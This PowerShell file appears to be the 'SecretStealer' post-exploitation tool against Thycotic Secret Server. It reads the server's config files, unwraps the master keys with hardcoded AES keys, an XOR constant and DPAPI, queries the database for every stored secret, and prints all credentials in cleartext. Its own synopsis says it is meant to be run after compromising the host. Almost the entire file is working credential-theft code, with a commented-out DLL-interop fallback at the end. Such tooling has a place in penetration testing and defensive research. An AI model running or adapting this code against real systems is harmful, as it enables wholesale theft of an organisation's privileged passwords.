function Invoke-SecretDecrypt 
{
<#
.SYNOPSIS
Decrypts a secret retrieved from a Thycotic Secret Server database. 
Author: DoI (@0x446f49)
License: BSD 3-Clause
Required Dependencies: None
Optional Dependencies: None
.DESCRIPTION
Invoke-SecretDecrypt will decrypt a single Thycotic Secret Server entry. 
The various data (keys, ivs, encryption.config) need to be manually
specified. Please see the README.md for more information.
.PARAMETER EncryptionConfig
The path to the encryption.config file, normally found within the Secret
Server web root.
.PARAMETER Item
The encrypted item value from the tbSecretItem table.
.Parameter ItemIV
The item value's IV from the tbSecretItem table.
.Parameter Key
The key from the tbSecrets table.
.PARAMETER IvMEK
The IvMEK from the tbSecrets database table.
.PARAMETER NewFormat
If specified, use the encryption.config decryption routine for >=v10.4 Secret Server
.EXAMPLE
Invoke-SecretDecrypt -EncryptionConfig C:\Users\user\encryption.config -Item 9993c5097491ba2b42a10b9a9b7a6ab7239b107337c348086eeb5f5b29c76f33 -ItemIV CF4C2D4F7FA432D64D9712212A06EEA9 -Key 5C195A500A3BF87C29163A52AC4EA2CFF6C5B69407B6F91A7C7B100B6D20121AAFD052C11B13D542EA2F42137258C2EF -IvMEK 6080667306DA295A75E22667E9AD0376
#>

    Param (
        [Parameter( Position = 0, Mandatory = $False )]
        [String]
        $EncryptionConfig,

        [Parameter( Position = 1, Mandatory = $True )]
        [String]
        $Item,

        [Parameter( Position = 2, Mandatory = $True )]
        [String]
        $ItemIV,

        [Parameter( Position = 3, Mandatory = $True )]
        [String]
        $Key,

        [Parameter( Position = 4, Mandatory = $True )]
        [String]
        $IVMek,

        [Parameter( Mandatory = $False )]
        [String]
        $MasterKey,

        [switch]$NewFormat = $False
    )

    if($MasterKey){
        $key256 = Convert-HexStringToByteArray($MasterKey)
    }
    else {
        if($NewFormat){
            $masterKeys = Get-MasterKeysv104($EncryptionConfig)
            if(-not $masterKeys){
                Write-Host "Failed to decrypt encryption.config"
                return
            }
        }
        else{
            loadDeserializer
            $masterKeys = Get-MasterKeys($EncryptionConfig)
            if(-not $masterKeys){
                Write-Host "Failed to decrypt encryption.config, may be using the new format. Try adding -NewFormat flag"
                return
            }
        }

        if($masterKeys.IsEncryptedWithDPAPI){ 
            Write-Host "Secret Server configuration uses DPAPI. Use Invoke-SecretStealer on the Secret Server host."
            return
        }

        $key256 = Convert-HexStringToByteArray($masterKeys.key256);
    }

    $IVMekBytes = Convert-HexStringToByteArray($IVMek);
    $KeyBytes = Convert-HexStringToByteArray $Key
    $ItemIVBytes =  Convert-HexStringToByteArray $ItemIV
    $ItemBytes = Convert-HexStringToByteArray $Item

    $aes = New-Object System.Security.Cryptography.AesCryptoServiceProvider
    $cryptoTransform = $aes.CreateDecryptor($key256, $IVMekBytes)
    $intermediateKey = $cryptoTransform.TransformFinalBlock($KeyBytes, 0, $KeyBytes.Length)
    
    $intKeyString = [System.BitConverter]::ToString($intermediateKey[0..32])
    Write-Verbose "Intermediate Key: $intKeyString"

    $cryptoTransform = $aes.CreateDecryptor($intermediateKey, $ItemIVBytes);
    $cleartext = [System.Text.Encoding]::Unicode.GetString($cryptoTransform.TransformFinalBlock($ItemBytes, 0, $ItemBytes.Length))
    
    Write-Host "Decrypted: $cleartext"
}

function Invoke-SecretStealer 
{
<#
.SYNOPSIS
Connects a Thycotic Secret Server database, extracts and decrypts all credentials.
Intended to be run after compromising the Thycotic Secret Server application server.
Author: DoI (@0x446f49)
License: BSD 3-Clause
Required Dependencies: None
Optional Dependencies: None
.DESCRIPTION
Invoke-SecretStealer will decrypt the various configuration files used by Secret
Server, connect to the database, extract all of the encrypted information and 
subsequetly decrypt and return the cleartext. 

This script is intended to be run directly on a Secret Server application server
after compromising the underlying host. 
.PARAMETER WebRoot
The path to the Secret Server web root. Normally C:\inetpub\wwwroot\SecretServer
or similar.
.PARAMETER NewFormat
If specified, use the encryption.config decryption routine for >=v10.4 Secret Server

.EXAMPLE
Invoke-SecretStealer -WebRoot 'C:\inetpub\wwwroot\SecretServer\'
#>

    Param (
        [Parameter( Position = 0, Mandatory = $True )]
        [String]
        $WebRoot,
        [switch]$NewFormat = $false
    )

    if((Get-Item $WebRoot) -is [System.IO.DirectoryInfo]){
        $DatabaseConfig = Join-Path $WebRoot "database.config"
        $EncryptionConfig = Join-Path $WebRoot "encryption.config"
    }
    else{
        throw "$WebRoot is not a directory."
    }

    loadDeserializer
    $dbConnectionString = Get-DatabaseConnectionString($DatabaseConfig);
    $dataSet = Invoke-SQL -connectionString $dbConnectionString -sqlCommand "select s.SecretName, f.SecretFieldName, s.[Key], s.IvMEK, i.ItemValue, i.IV from tbSecretItem as i JOIN tbSecret as s ON (s.SecretID = i.SecretID) JOIN tbSecretField as f on (i.SecretFieldID = f.SecretFieldID)";

    if ($NewFormat){                    
        $masterKeys = Get-MasterKeysv104 -path $EncryptionConfig
        if(-not $masterKeys){
            Write-Host "Failed to decrypt encryption.config"
            return
        }
    }else{
        $masterKeys = Get-MasterKeys -path $EncryptionConfig
        if(-not $masterKeys){
            Write-Host "Failed to decrypt encryption.config, may be using the new format. Try adding -NewFormat flag"
            return
        }
    }
    
    $SecretName = $null;
    $aes = New-Object System.Security.Cryptography.AesCryptoServiceProvider
    
    if($masterKeys.isEncryptedWithDPAPI){
        Write-Verbose "Encryption.config values are encrypted with DPAPI, decrypting..."
        $encryptedValue = $masterKeys.key256
        $key256 = Convert-HexStringToByteArray(DPAPIDecrypt -base64blob $encryptedValue)
    }
    else{
        $key256 = Convert-HexStringToByteArray($masterKeys.key256);
    }

    foreach($row in $dataSet.Rows){
        if($SecretName -ne $row.SecretName){
            $cryptoTransform = $aes.CreateDecryptor($key256, $row.IvMEK)
            $intermediateKey = $cryptoTransform.TransformFinalBlock($row.key, 0, $row.key.Length)
            $intKeyString = [System.BitConverter]::ToString($intermediateKey[0..32])
            Write-Verbose "Intermediate Key: $intKeyString"

            $SecretName = $row.SecretName;
        }

        $ItemBytes = Convert-HexStringToByteArray $row.ItemValue
        $cryptoTransform = $aes.CreateDecryptor($intermediateKey, $row.iv);
        $cleartext = [System.Text.Encoding]::Unicode.GetString($cryptoTransform.TransformFinalBlock($ItemBytes, 0, $ItemBytes.Length))
        Write-Host -Separator "," $row.SecretName $row.SecretFieldName $cleartext
    }
}

function Local:Get-MasterKeys{  
    Param (
        [Parameter( Position = 0, Mandatory = $True )]
        [String]
        $path
    )
  
    try{
        $master = [Thycotic.ihawu.Business.Config]::DecryptConfig($path)
    }
    catch [System.Runtime.Serialization.SerializationException]{
        return $false
    }

    foreach($i in $master.Pairs){
        switch($i.key){
            "key" {
                $key = $i.Value
                Write-Verbose "Got master key: $key"
             }
            "key256" {
                $key256 = $i.Value
                Write-Verbose "Got master key256: $key256"
             }
            "iv" {
                $iv = $i.Value
                Write-Verbose "Got master IV: $iv"
            }
        }
    }
    if(!$key -or !$key256 -or !$iv){
        throw "Could not retrieve information from encryption.config"
    }

    return $master
}

function Local:Get-MasterKeysv104{
    Param (
        [Parameter( Position = 0, Mandatory = $True )]
        [String]
        $path
    )

    $IV = Convert-HexStringToByteArray "ad478c63f93d5201e0a1bbfff0072b6b"
    $key = Convert-HexStringToByteArray "83fb558645767abb199755eafb4fbc5167113da8ee69f13267388dc3adcdb088"

    <# 
    Master key decryption for the new version works something like:
       - Open encryption.config
       - Read the data after the ASCII file header (+41 bytes)
       - Decrypt with the hardcoded keys
       - De-XOR the key count
       - De-XOR all the key-value pairs with the Magic XOR Value
       - use the key256 value as the master encryption key

       After the initial decryption, the new Thycotic encryption format looks like:
       <UINT32 - total keys XOR value><UINT32 - total keys>
       <UINT32 - key-len xor value><UINT32 - key-len><byte[] key>
       <UINT32 - value-len xor value><UINT32 - value-len><byte[] value>
    #>

    $aes = New-Object "System.Security.Cryptography.AesManaged"
    $aes.Mode = [System.Security.Cryptography.CipherMode]::CBC
    $aes.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
    $aes.BlockSize = 128
    $aes.KeySize = 256
    $aes.Key = $key
    $aes.IV = $IV

    $bytes = [System.IO.File]::ReadAllBytes($path)
    $bytes = $bytes[41..$bytes.Length]; # Skip the ASCII file header

    $decryptor = $aes.CreateDecryptor();
    $encryptionConfig = $decryptor.TransformFinalBlock($bytes, 0, $bytes.Length);
    $aes.Dispose()

    $numKeys = [System.BitConverter]::ToInt32($encryptionConfig[1..4],0) -bxor [System.BitConverter]::ToInt32($encryptionConfig[5..8],0);
    Write-Verbose "encryption.config key count: $numKeys";

    $config = @{}; # hash table to store the config parameters
    $encPos = 9; # current position in the encryption.config blob

    for($i = 0; $i -lt $numKeys; $i++){
        # get the key
        $lengthVal = [System.BitConverter]::ToInt32($encryptionConfig[($encPos+4)..($encPos+7)],0);
        $lengthXOR = [System.BitConverter]::ToInt32($encryptionConfig[$encPos..($encPos+3)],0);
        $len = $lengthVal -bxor $lengthXOR

        $key = Get-XORValue $encryptionConfig[($encPos+8)..($encPos+7+$len)]
        $keyString = [System.Text.Encoding]::Unicode.GetString($key)
        Write-Verbose "Got encryption.config key: $keyString";

        $encPos += 8+$len # onto the data field
        
        # get the value
        $lengthVal = [System.BitConverter]::ToInt32($encryptionConfig[($encPos+4)..($encPos+7)],0);
        $lengthXOR = [System.BitConverter]::ToInt32($encryptionConfig[$encPos..($encPos+3)],0);
        $len = $lengthVal -bxor $lengthXOR

        $value = Get-XORValue $encryptionConfig[($encPos+8)..($encPos+7+$len)]
        $valueString = [System.Text.Encoding]::Unicode.GetString($value)
        Write-Verbose "Got encryption.config value: $valueString";
        
        $encPos += 8+$len # onto the next entry

        $config.add($keyString,$valueString)
    }
    
    return $config
}

function Local:Get-XORValue($bytes){
    $XORMagic = Convert-HexStringToByteArray "8200ab18b1a1965f1759c891e87bc32f208843331d83195c21ee03148b531a0e"
    $XORPos = 0;
    $out = New-Object Byte[] $bytes.count

    for($i=0; $i -lt $out.count; $i++){     
        $out[$i] = $bytes[$i] -bxor $XORMagic[$XORPos]
        $XORPos++
        
        if($XORPos -gt 31){
            $XORPos = 0
        }
    }

    return $out
}

function Local:DPAPIDecrypt{
        Param (
        [Parameter( Position = 0, Mandatory = $True )]
        [String]
        $base64blob
    )
    Add-Type -AssemblyName System.Security
    Write-Verbose "Decrypting DPAPI encrypted data..."
    $decrypted = [Security.Cryptography.ProtectedData]::Unprotect([Convert]::FromBase64String($base64blob), $null, 'LocalMachine')
    $decstr = [Text.Encoding]::ASCII.GetString($decrypted)

    return $decstr
}
function Local:DecryptNewFormat{

    Param (
        [Parameter( Mandatory = $True )]
        [String]
        $webroot
    )
    
    LoadEncryptionDll
    $keys = [SecretStealer.Loot]::Decrypt($webRoot)


    if ($keys.IsEncryptedWithDPAPI -eq "true"){
        Write-Verbose "Encryption.config values are encrypted with DPAPI, decrypting..."
        $encryptedValue = $keys.key256
        $key256val = DPAPIDecrypt -base64blob $encryptedValue
        
    }else{
        $key256val = $keys.key256
    }
    Write-Verbose "Got master key: $key256val"
    return @{"key256" = Convert-HexStringToByteArray($key256val)}
      
}

function Local:Get-DatabaseConnectionString{
    Param (
        [Parameter( Position = 0, Mandatory = $True )]
        [String]
        $path
    )
    
    $config = [Thycotic.ihawu.Business.Config]::DecryptConfig($path);

    foreach($i in $config.Pairs){
        if($i.key -eq "ConnectionString"){
            $con = $i.Value
            Write-Verbose "Connection string: $con";
            return $con;
        }
    }

    throw "Could not retrieve database connection string from database.config"
}

# This is the decrypter/deserializer for < SecretServer 10.4 encryption.config files
# and database.config files for all versions
function Local:loadDeserializer{

    $Assem = ( 
        “System",
        "System.IO",
        "System.Reflection",
        "System.Runtime.Serialization"
    ) 
    
    # I know... I know...
    $Source = @” 
    using System; 
    using System.IO;
    using System.Reflection;
    using System.Runtime.Serialization;
    using System.Runtime.Serialization.Formatters.Binary;
    using System.Security.Cryptography;
    using System.Text;

    namespace Thycotic.ihawu.Business
    {
        [Serializable]
        public class EncryptedFile
        {
            public EncryptedPair[] Pairs = new EncryptedPair[0];
        }

        [Serializable]
        public class EncryptedPair
        {
            public string Key;
            public string Value;
        }

        public class Binder : SerializationBinder
        {
            public override Type BindToType(string assemblyName, string typeName)
            {
                // Define the new type to bind to
                Type typeToDeserialize = null;
                // Get the current assembly
                string currentAssembly = Assembly.GetExecutingAssembly().FullName;

                // Create the new type and return it
                typeToDeserialize = Type.GetType(string.Format("{0}, {1}", typeName, currentAssembly));
                return typeToDeserialize;
            }
        }

        public class Config
        {
            public static object DecryptConfig(string path)
            {
                string key = "020216980119760c0b79017097830b1d";
                string iv = "7a790a22020b6eb3630cdd080310d40a";

                AesCryptoServiceProvider aes = new AesCryptoServiceProvider();
                aes.Key = StringToByteArray(key);
                aes.IV = StringToByteArray(iv);

                ICryptoTransform decryptor = aes.CreateDecryptor();

                var stream = new FileStream(path, FileMode.Open);
                CryptoStream cryptoStream = new CryptoStream((Stream)stream, decryptor, CryptoStreamMode.Read);

                var binFormat = new BinaryFormatter();
                binFormat.Binder = new Binder();
                binFormat.AssemblyFormat = System.Runtime.Serialization.Formatters.FormatterAssemblyStyle.Simple;

                object ret = binFormat.Deserialize(cryptoStream);
                cryptoStream.Close();
                stream.Close();
                return ret;
             }

             public static byte[] StringToByteArray(String hex)
             {
                int NumberChars = hex.Length;
                byte[] bytes = new byte[NumberChars / 2];
                for (int i = 0; i < NumberChars; i += 2)
                    bytes[i / 2] = Convert.ToByte(hex.Substring(i, 2), 16);
                return bytes;
             }
         }
    }
“@ 
    
    Add-Type -ReferencedAssemblies $Assem -TypeDefinition $Source -Language CSharp  
}

# Thanks SANS!
function Local:Convert-HexStringToByteArray{
[CmdletBinding()]
Param ( [Parameter(Mandatory = $True, ValueFromPipeline = $True)] [String] $String )
 
#Clean out whitespaces and any other non-hex crud.
$String = $String.ToLower() -replace '[^a-f0-9\\,x\-\:]',"
 
#Try to put into canonical colon-delimited format.
$String = $String -replace '0x|\x|\-|,',':'
 
#Remove beginning and ending colons, and other detritus.
$String = $String -replace '^:+|:+$|x|\',"
 
#Maybe there's nothing left over to convert...
if ($String.Length -eq 0) { ,@() ; return }
 
#Split string with or without colon delimiters.
if ($String.Length -eq 1)
{ ,@([System.Convert]::ToByte($String,16)) }
elseif (($String.Length % 2 -eq 0) -and ($String.IndexOf(":") -eq -1))
{ ,@($String -split '([a-f0-9]{2})' | foreach-object { if ($_) {[System.Convert]::ToByte($_,16)}}) }
elseif ($String.IndexOf(":") -ne -1)
{ ,@($String -split ':+' | foreach-object {[System.Convert]::ToByte($_,16)}) }
else
{ ,@() }
}

# Thanks Chris Magnuson!
function Local:Invoke-SQL {
    param(
        [string]$connectionString,
        [string]$sqlCommand = $(throw "Please specify a query."),
        $Credential = [System.Management.Automation.PSCredential]::Empty
    )

    $connection = new-object system.data.SqlClient.SQLConnection($connectionString)
    $command = new-object system.data.sqlclient.sqlcommand($sqlCommand,$connection)
    $connection.Open()
    
    $adapter = New-Object System.Data.sqlclient.sqlDataAdapter $command
    $dataset = New-Object System.Data.DataSet
    $adapter.Fill($dataSet) | Out-Null
    
    $connection.Close()
    
    return $dataSet.Tables
}

<#
# Imports the >=v10.4 Thycotic.ihawu.EncryptionProtection_x64.dll and uses it to decrypt the encryption.config file.
# Not tested on x86 hosts, there's a seperate Thycotic.ihawu.EncryptionProtection_x86.dll for that arch.
#
# This interop code has been left in as a fall-back and guide for the Secret Server encryption.config logic.
# If the encryption.config logic changes with another release, this interop code might end up proving usefull
#

function Local:LoadEncryptionDll{

       $Assem = ( 
        “System",
        "System.IO",
        "System.Reflection",
        "System.Runtime.Serialization"
    ) 
    #drop into C# land and set up our interop
    $source= @"
   using System;
using System.Text;
using System.Runtime.InteropServices;
using System.Diagnostics;
using System.Collections;

namespace SecretStealer
{
    public class Loot
    {

        public static string ByteArrayToString(byte[] ba)
        {
            StringBuilder hex = new StringBuilder(ba.Length * 2);
            foreach (byte b in ba)
                hex.AppendFormat("{0:x2}", b);
            return hex.ToString();
        }

        public static string PtrToString(IntPtr ip, int len)
        {
            byte[] ba= new byte[len];
            Marshal.Copy(ip, ba, 0, len);
            byte[] keyutf8Bytes = Encoding.Convert(Encoding.Unicode, Encoding.UTF8, ba);
            return Encoding.Default.GetString(keyutf8Bytes);
        }


        public static Hashtable Decrypt(string wwwroot)
        {
                      
            string target_dll = wwwroot + "\\bin\\Thycotic.ihawu.EncryptionProtection_x64.dll";
            string confpath = wwwroot + "\\encryption.config";
            encloader enc1 = new encloader(target_dll);

            //Need this to call into the dll
            Environment.SetEnvironmentVariable("Thycotic CAC", "5uK10RwTp6tCZQnwVqo5"); 


            IntPtr handle = IntPtr.Zero;
            
            enc1.LoadConfiguration(confpath, out handle);          
            if (handle == IntPtr.Zero)
            {
                Console.WriteLine("Failed to load config!");
            }


            int paircount;
            enc1.GetPairCount(handle, out paircount);
            

            Hashtable valuesT = new Hashtable();
            for (int i = 0; i < paircount; i++)
            {
                IntPtr key;
                IntPtr val;
                int length;


                //Now get k,v
  
                enc1.GetPairKeyByIndex(handle, i, out key, out length);
                string keyStr = PtrToString(key, length);

                enc1.GetPairValByIndex(handle, i, out val, out length);
                string valStr = PtrToString(val, length);
                valuesT.Add(keyStr, valStr);
                                
            }

                       
            return valuesT;
        }
    }



    public class encloader
    {
        //Stuff for importing dlls
        [DllImport("kernel32.dll")]
        public static extern IntPtr LoadLibrary(string dllToLoad);

        [DllImport("kernel32.dll")]
        public static extern IntPtr GetProcAddress(IntPtr hModule, string procedureName);

        //interop function delegates
        [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
        public delegate int fn_GetPairCount(IntPtr handle, out int pairCount);

        [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
        public delegate int fn_GetPairKeyByIndex(IntPtr handle, int index, out IntPtr key, out int length);

        [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
        public delegate int fn_GetPairValByIndex(IntPtr handle, int index, out IntPtr val, out int length);

        [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
        public delegate int fn_LoadConfiguration([MarshalAs(UnmanagedType.LPWStr)] string path, out IntPtr handle);


        public fn_GetPairCount l_getPairCount;

        public fn_GetPairKeyByIndex l_getPairKeyByIndex;

        public fn_GetPairValByIndex l_getPairValByIndex;

        public fn_LoadConfiguration l_loadConfiguration;

        private IntPtr handle;

        public encloader(string dll)
        {
            handle = LoadLibrary(dll);

            IntPtr addr_loadconfig = GetProcAddress(handle, "LoadConfiguration");
            IntPtr addr_getpaircount = GetProcAddress(handle, "GetPairCount");
            IntPtr addr_getpairkeybi = GetProcAddress(handle, "GetPairKeyByIndex");
            IntPtr addr_getpairvalbi = GetProcAddress(handle, "GetPairValByIndex");

            l_loadConfiguration = (fn_LoadConfiguration)Marshal.GetDelegateForFunctionPointer(addr_loadconfig, typeof(fn_LoadConfiguration));                   
            l_getPairCount = (fn_GetPairCount)Marshal.GetDelegateForFunctionPointer(addr_getpaircount, typeof(fn_GetPairCount));
            l_getPairKeyByIndex = (fn_GetPairKeyByIndex)Marshal.GetDelegateForFunctionPointer(addr_getpairkeybi, typeof(fn_GetPairKeyByIndex));
            l_getPairValByIndex = (fn_GetPairValByIndex)Marshal.GetDelegateForFunctionPointer(addr_getpairvalbi, typeof(fn_GetPairValByIndex));
                    
        }


        //expose functions for calling
        public int LoadConfiguration(string path, out IntPtr handle)
        {
            return l_loadConfiguration(path, out handle);

        }

        public int GetPairCount(IntPtr handle, out int pairCount)
        {
            return l_getPairCount(handle, out pairCount);
        }

        public int GetPairKeyByIndex(IntPtr handle, int index, out IntPtr key, out int length)
        {
            return l_getPairKeyByIndex(handle, index, out key, out length);
        }

        public int GetPairValByIndex(IntPtr handle, int index, out IntPtr val, out int length)
        {
            return l_getPairValByIndex(handle, index, out val, out length);
        }
        
    }

}

"@
Add-Type -ReferencedAssemblies $Assem -TypeDefinition $Source -Language CSharp 


}
#>
